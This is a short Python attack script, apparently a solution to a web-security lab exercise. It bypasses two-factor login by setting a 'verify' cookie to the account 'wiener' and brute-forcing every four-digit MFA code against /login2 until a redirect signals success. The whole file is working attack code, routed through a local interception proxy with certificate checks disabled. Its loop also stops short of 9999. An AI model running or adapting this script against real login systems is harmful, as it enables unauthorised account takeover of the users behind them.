#!/bin/python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# HOST=sys.argv[1]
PATH="login2"

# TODO: #1
# Make a GET request to /login2 passing in the name of the user.
# This will trigger the 2FA email and create a valid PIN.
def get_2fa():
    cookie_dict={"verify": "wiener"}
    r=requests.get(HOST+PATH, cookies=cookie_dict,proxies=proxies,verify=False)
    res = r.status_code
    print(res)



# TODO: #2
# Loop around the potential pin space, 0001-9999. Make sure to format the numbers correctly.

def submit_mfa(MFA):
    cookie_dict={"verify": "wiener"}
    MFA_payload=f"mfa-code={MFA}"
    r=requests.post(HOST+PATH, data=MFA_payload, cookies=cookie_dict,proxies=proxies,verify=False)
    res = r.status_code
    if r.history:
        print("We got redirected..")
        for resp in r.history:
            (print(resp.status_code, resp.url))
        return 42

def pin_loop():
    for num in range(1,9999):
        test_pin=f"{num:04d}"
        print(f"Now testing: {test_pin}")
        if submit_mfa(test_pin) == 42:
            break

if __name__ == "__main__":
    try:
        HOST = sys.argv[1].strip()
        # print(sys.argv[1])
    except IndexError:
        print("[-] Error: You're missing the URL!!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        exit(-1)

    # get_2fa()
    # submit_mfa("1732")
    pin_loop()